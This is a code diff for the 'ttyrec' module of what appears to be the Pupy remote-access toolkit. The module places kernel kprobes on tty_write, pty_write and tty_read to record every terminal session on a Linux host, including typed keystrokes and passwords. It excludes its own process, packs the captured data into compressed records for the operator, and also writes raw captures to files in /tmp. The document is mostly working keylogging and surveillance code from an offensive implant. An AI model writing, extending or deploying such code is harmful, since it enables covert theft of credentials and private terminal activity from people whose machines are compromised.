@@ -16,21 +16,36 @@ from threading import Lock
 
 from pupy import manager, Task
 
+try:
+    from network.lib.transports.cryptoutils import get_random
+except ImportError:
+    def get_random(cnt):
+        with open('/dev/urandom', 'rb') as urandom:
+            return urandom.read(cnt)
+
 if not __name__ == '__main__':
     from network.lib.buffer import Buffer
+
+DEBUGFS='/sys/kernel/debug'
 
 KPROBE_REGISTRY='tracing/kprobe_events'
 TRACE_PIPE='tracing/trace_pipe'
 TRACE='tracing/trace'
 KPROBE_EVENTS='tracing/events/kprobes'
 KPROBES_ENABLED='kprobes/enabled'
-DEBUGFS='/sys/kernel/debug'
+
+# These are to derive tty_struct from file*
+# name can be found from synclink.ko:mgsl_stop/mgsl_start
+TTY_PRIVATE_2 = '0x0'
+
 
 class KProbesNotAvailable(Exception):
     pass
 
+
 class KProbesNotEnabled(Exception):
     pass
+
 
 class Kallsyms(object):
     def __init__(self):
@@ -40,26 +55,161 @@ class Kallsyms(object):
                 addr, t, name = ks.split(' ')[:3]
                 setattr(self, name, addr)
 
+
+class TTYState(object):
+    __slots__ = (
+        'size', 'first_input'
+    )
+
+    def __init__(self):
+        self.size = None
+        self.first_input = None
+
+    def need_resize(self, size):
+        if self.size is None:
+            self.size = size
+            return True
+
+        if self.size != size:
+            self.size = size
+            return True
+
+        return False
+
+    def get_last_input(self, ts):
+        ts = float(ts)
+        if self.first_input is None:
+            self.first_input = ts
+            return 0.0
+
+        return ts - self.first_input
+
+
+class Probe(object):
+    __slots__ = (
+        'type', 'name', 'func', 'args', 'kwargs'
+    )
+
+    def __init__(self, type, name, func, *args, **kwargs):
+        self.type = type
+        self.name = name
+        self.func = func
+        self.args = args
+        self.kwargs = kwargs
+
+    @property
+    def registered(self):
+        return os.path.exists(
+            os.path.join(DEBUGFS, KPROBE_EVENTS, self.name, 'enable')
+        )
+
+    @property
+    def statement(self):
+        parts = [
+            self.type + ':' + self.name,
+            self.func
+        ]
+
+        parts.extend(self.args)
+
+        statement = ' '.join(parts)
+        if self.kwargs:
+            statement = statement.format(**self.kwargs)
+
+        return statement
+
+    def enable(self):
+        if not self.registered:
+            return
+
+        with open(os.path.join(
+                DEBUGFS, KPROBE_EVENTS, self.name, 'enable'), 'w') as enable:
+            enable.write('1\n')
+
+    def disable(self):
+        if not self.registered:
+            return
+
+        with open(os.path.join(
+                DEBUGFS, KPROBE_EVENTS, self.name, 'enable'), 'w') as enable:
+            enable.write('0\n')
+
+    def unregister(self):
+        if not self.registered:
+            return
+
+        try:
+            with open(os.path.join(
+                    DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
+                registry.write('-:' + self.name+'\n')
+        except IOError:
+            pass
+
+
 class TTYMon(object):
-    def __init__(self, probe_name='ttymon', ignore=[]):
+    def __init__(self, name, winsize, tty_private, ignore=[]):
         self.validate()
 
         kallsyms = Kallsyms()
 
         self._ignore = [ignore] if type(ignore) is int else ignore
-        self._probe_name = probe_name
 
-        self._tty_write_statement = 'p:{}_w 0x{} %dx:s32 +0(%si):string'.format(
-            self._probe_name, kallsyms.tty_write
-        )
-
-        self._tty_read_statement = 'r:{}_r 0x{} $retval:s64 +0($stack2):string'.format(
-            self._probe_name, kallsyms.tty_read
-        )
-
-        self._tty_read_statement_new = 'r:{}_r tty_read $retval:s64 +0($stack2):string'.format(
-            self._probe_name
-        )
+        self._probes = [
+            Probe(
+                'p',
+                'tty_o',
+                '0x{addr}',
+                '+{tty_name_offt}(+{struct}(+{private}({vfs_file}))):string',
+                '+{winsiz_offt_x}(+{struct}(+{private}({vfs_file}))):u16',
+                '+{winsiz_offt_y}(+{struct}(+{private}({vfs_file}))):u16',
+                '{size}:s32',
+                '+0({buffer}):string',
+                addr=kallsyms.tty_write,
+                buffer=r'%si',
+                vfs_file=r'%di',
+                size=r'%dx',
+                tty_name_offt=name,
+                struct=TTY_PRIVATE_2,
+                private=tty_private,
+                winsiz_offt_x=winsize+2,
+                winsiz_offt_y=winsize
+            ),
+            Probe(
+                'p',
+                'pty_o',
+                '0x{addr}',
+                '+{tty_name_offt}({tty_struct}):string',
+                '+{winsiz_offt_x}({tty_struct}):u16',
+                '+{winsiz_offt_y}({tty_struct}):u16',
+                '{size}:s32',
+                '+0({buffer}):string',
+                addr=kallsyms.pty_write,
+                buffer=r'%si',
+                tty_struct=r'%di',
+                size=r'%dx',
+                tty_name_offt=name,
+                winsiz_offt_x=winsize+2,
+                winsiz_offt_y=winsize
+            ),
+            Probe(
+                'r',
+                'tty_i',
+                'tty_read',
+                '+{tty_name_offt}(+{struct}(+{private}({vfs_file}))):string',
+                '+{winsiz_offt_x}(+{struct}(+{private}({vfs_file}))):u16',
+                '+{winsiz_offt_y}(+{struct}(+{private}({vfs_file}))):u16',
+                '{size}:s64',
+                '+0({buffer}):string',
+                vfs_file='$stack1',
+                buffer='$stack2',
+                size='$retval',
+                tty_name_offt=name,
+                struct=TTY_PRIVATE_2,
+                private=tty_private,
+                winsiz_offt_x=winsize+2,
+                winsiz_offt_y=winsize
+            )
+        ]
 
         self._tty_cache = {}
         self._started = False
@@ -67,9 +217,9 @@ class TTYMon(object):
         self._stopped = True
         self._pipe = None
         self._pipe_fd = None
-        self._parser_body = r'\s+(\S+)-(\d+)\s+\[\d+\]\s+[^\s]+\s+(\d+)\.(\d+):' \
-            r'\s+{}_([r|w]):\s+\([^+]+\+[^)]+\)\s+arg1=(\d+)\s+arg2="'.format(
-                self._probe_name)
+        self._parser_body = r'\s+([^-]+)-(\d+)\s+\[\d+\]\s+[^\s]+\s+(\d+\.\d+):' \
+            r'\s+({})_([o|i]):\s+\([^+]+\+[^)]+\)\s+arg1="([^"]+)"\s+arg2=(\d+)\s+arg3=(\d+)\s+arg4=(-?\d+)\s+arg5="'.format(
+                '|'.join(probe.name.rsplit('_', 1)[0] for probe in self._probes))
 
         self._parser_start = re.compile(self._parser_body)
         self._parser_end = re.compile('"\n'+self._parser_body, re.MULTILINE)
@@ -97,52 +247,38 @@ class TTYMon(object):
         self._stopped = False
         self._stopping = False
 
+        statement = '\n'.join(
+            probe.statement for probe in self._probes
+        ) + '\n'
+
         try:
-            with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
-                registry.write(self._tty_write_statement+'\n')
-                # Try to use explicit symbol name
-                registry.write(self._tty_read_statement_new+'\n')
+            with open(os.path.join(
+                    DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
+                registry.write(statement)
+
+            for probe in self._probes:
+                probe.enable()
 
         except IOError:
-            with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
-                registry.write(self._tty_write_statement+'\n')
-                # Try to use explicit symbol name
-                registry.write(self._tty_read_statement+'\n')
-
-        with open(os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_w', 'enable'), 'w') as enable:
-            enable.write('1\n')
-        with open(os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_r', 'enable'), 'w') as enable:
-            enable.write('1\n')
+            self._disable()
+            raise
 
         self._started = True
 
     def _disable(self):
-        w_enable = os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_w', 'enable')
-        r_enable = os.path.join(DEBUGFS, KPROBE_EVENTS, self._probe_name+'_r', 'enable')
+        statement = '\n'.join(
+            ('-:' + probe.name) for probe in self._probes
+        ) + '\n'
 
-        if os.path.exists(w_enable):
-            with open(w_enable, 'w') as enable:
-                enable.write('0\n')
-        else:
-            w_enable = None
+        for probe in self._probes:
+            probe.disable()
 
-        if os.path.exists(r_enable):
-            with open(r_enable, 'w') as enable:
-                enable.write('0\n')
-        else:
-            r_enable = None
-
-        if w_enable or r_enable:
-            if w_enable:
-                with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
-                    registry.write('-:{}_w\n'.format(self._probe_name)+'\n')
-
-            if r_enable:
-                with open(os.path.join(DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
-                    registry.write('-:{}_r\n'.format(self._probe_name)+'\n')
-
-        self._started = False
-        self._stopped = True
+        try:
+            with open(os.path.join(
+                    DEBUGFS, KPROBE_REGISTRY), 'w') as registry:
+                registry.write(statement)
+        except IOError:
+            pass
 
     def __iter__(self):
         self._enable()
@@ -174,95 +310,115 @@ class TTYMon(object):
         more = True
         buf = ''
 
+        debug = open('/tmp/debug.txt', 'w+')
+        groups_debug = open('/tmp/groups.txt', 'w+')
+
         while not self._stopping:
             if more:
                 try:
                     r = os.read(self._pipe_fd, 8192)
+
+                    debug.write(r)
                     buf += r
                 except OSError, e:
                     if e.errno not in (errno.EAGAIN, errno.ENODATA):
                         raise
 
-                    _, _, xlist = select.select([self._pipe], [], [self._pipe], 10)
+                    _, _, xlist = select.select(
+                        [self._pipe], [], [self._pipe], 10
+                    )
                     if xlist:
                         break
 
                     continue
 
             start = self._parser_start.search(buf)
-            if not start:
+            more = not bool(start)
+            if more:
                 more = True
                 continue
 
-            header_end = start.end()
-
-            rest = buf[header_end:]
-
+            rest = buf[start.end():]
             end = self._parser_end.search(rest)
-            eob = len(rest)
+            more = not bool(end)
 
-            if end:
-                eob = end.start()+2
-                more = False
-            else:
-                more = True
-                # Need more data
-                # We will lose last block, but who cares
-                if not buf.endswith('"\n'):
-                    continue
+            if more:
+                continue
 
-            comm, pid, sec, usec, probe, items = start.groups()
+            comm, pid, ts, rule, probe, tty_name, x, y, items = \
+                start.groups()
+
+            groups_debug.write(repr(start.groups()) + '\n')
+
             pid = int(pid)
             items = int(items)
-            sec = int(sec)
-            usec = int(usec)
+            x = int(x)
+            y = int(y)
 
-            data = rest[:items]
-            buf = rest[eob:]
+            data = rest[:end.start()]
+            buf = rest[end.start()+2:]
 
-            if pid not in self._ignore:
-                cached_tty, cached_sec = self._tty_cache.get(
-                    pid, (None, None))
+            if items > 0:
+                data = data[:items]
+            else:
+                # Something went wrong
+                continue
 
-                if not cached_tty or (sec - cached_sec > 600):
-                    cached_sec = sec
-                    try:
-                        cached_tty = os.readlink('/proc/{}/fd/1'.format(pid))
-                    except (OSError, IOError):
-                        cached_tty = None
+            if tty_name.startswith('ptm'):
+                # Throw away this crap
+                continue
 
-                    self._tty_cache[pid] = cached_tty, cached_sec
+            if rule == 'tty' and not tty_name.startswith(
+                    'tty') and probe == 'o':
+                # Throw away pty/tty duplicates
+                continue
 
-                yield cached_tty, comm, pid, probe, sec, usec, data
+            if tty_name not in self._tty_cache:
+                self._tty_cache[tty_name] = TTYState()
+
+            ts = self._tty_cache[tty_name].get_last_input(ts)
+
+            if pid in self._ignore:
+                continue
+
+            if self._tty_cache[tty_name].need_resize((x, y)):
+                yield tty_name, comm, pid, 'R', ts, (x, y)
+
+            yield tty_name, comm, pid, probe, ts, data
 
 
 class TTYRec(Task):
     __slots__ = ('_ttymon', '_results_lock', '_state', '_event_id')
 
-    def __init__(self, manager, event_id=None):
+    def __init__(self, manager, event_id=None,
+            name=None, winsize=None, tty_private=None):
         super(TTYRec, self).__init__(manager)
-        self._ttymon = TTYMon(ignore=[os.getpid(), os.getppid()])
+        self._ttymon = TTYMon(
+            name, winsize, tty_private, ignore=[os.getpid(), os.getppid()]
+        )
         self._results_lock = Lock()
         self._buffer = Buffer()
         self._compressor = zlib.compressobj(9)
         self._event_id = event_id
+        self._session = 0
 
     def task(self):
-        for cached_tty, comm, pid, probe, sec, usec, buf in self._ttymon:
-            if cached_tty:
-                cached_tty = cached_tty.rsplit('/', 1)[-1]
-            else:
-                cached_tty = ''
+        self._session, = struct.unpack('<I', get_random(4))
 
-            cached_tty = cached_tty[:8].ljust(8)
+        for tty_name, comm, pid, probe, ts, buf in self._ttymon:
+
+            tty_name = tty_name[:8].ljust(8)
             comm = comm[:16].ljust(16)
+
+            if probe == 'R':
+                buf = struct.pack('<HH', *buf)
 
             with self._results_lock:
                 packet = self._compressor.compress(
                     struct.pack(
-                        '<8s16ssIIII',
-                        cached_tty, comm, probe, pid,
-                        sec, usec, len(buf)) + buf)
+                        '<I8s16ssIfI',
+                        self._session, tty_name, comm, probe, pid,
+                        ts, len(buf)) + buf)
                 self._buffer.append(packet)
 
                 fire_event = False
@@ -304,11 +460,11 @@ class TTYRec(Task):
         return self._ttymon.active
 
     def stop(self):
-        super(TTYRec, self).stop()
         self._ttymon.stop()
+        super(TTYRec, self).stop()
 
 
-def start(event_id=None):
+def start(event_id=None, name=0xE0, winsize=0x1B0, tty_private=0x30):
     try:
         if manager.active(TTYRec):
             return False
@@ -318,30 +474,17 @@ def start(event_id=None):
         except:
             pass
 
-    return manager.create(TTYRec, event_id=event_id)
+    return manager.create(
+        TTYRec, event_id=event_id,
+        name=name, winsize=winsize, tty_private=tty_private
+    )
+
 
 def stop():
     return manager.stop(TTYRec)
+
 
 def dump():
     ttyrec = manager.get(TTYRec)
     if ttyrec:
         return ttyrec.results
-
-if __name__ == '__main__':
-    mon = TTYMon(ignore=[os.getpid(), os.getppid()])
-
-    recs = {}
-
-    try:
-        for comm, pid, probe, sec, usec, buf in mon:
-            key = frozenset((comm, pid, probe))
-
-            if key not in recs:
-                recs[key] = open('rec.{}.{}.{}.{}'.format(sec, comm, pid, probe), 'w')
-
-            recs[key].write(struct.pack('<III', sec, usec, len(buf)) + buf)
-
-    finally:
-        for rec in recs.itervalues():
-            rec.close()
